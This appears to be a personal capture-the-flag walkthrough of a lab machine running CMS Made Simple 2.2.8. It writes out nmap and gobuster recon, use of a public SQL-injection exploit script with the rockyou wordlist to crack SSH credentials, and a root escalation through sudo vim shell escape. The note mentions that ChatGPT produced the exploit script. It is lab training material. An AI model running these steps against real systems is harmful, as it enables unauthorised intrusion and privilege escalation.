2025-06-19 16:43

Status:

Tags: #CTF 

# Simple CTF

# Recon 
1. Nmap scan 
	- ``nmap 10.10.40.158 -sVC -Pn``
- output 
```bash
21/tcp open ftp vsftpd 3.0.3
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
```
2. directory brute using gobuster
- `` gobuster dir -u  http://10.10.40.158/  -w /usr/share/wordlists/dirb/common.txt``
- out put gives 
	- ``/simple ``
3. Web enumeration
	- we will find out CMS Made simple version 2.2.8
4. CVE (make simple )
- search for  simple version 2.2.8 in search exploit 
	-  `` searchsploit "made simple"``
```bash
CMS Made Simple < 2.2.10 - SQL Injection      | php/webapps/46635.py 
```
- so I have used script for python3 saved as 446636.py by chatgpt 
- creaking the password using python 
```bash
python 46636.py -u http://10.10.40.158/simple -c -w /usr/share/wordlists/rockyou.txt.gz\n 
```
- output cracked password : secret and username : mitch   
5. Shell acess
- login ssh 
	- ``ssh mitch@10.10.40.158 -p 2222 ``
6. flag 1
```bash
pwd
/home/mitch
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up! 
```
7. privileged SUID
```bash
sudo -l 
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim 
```
8. Privilege Escalation - vim/ gtfobins
```bash
sudo vim -c ':!/bin/sh' 
```
9. Final flag 
```bash
cd /
# cd root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it! 
```





### References
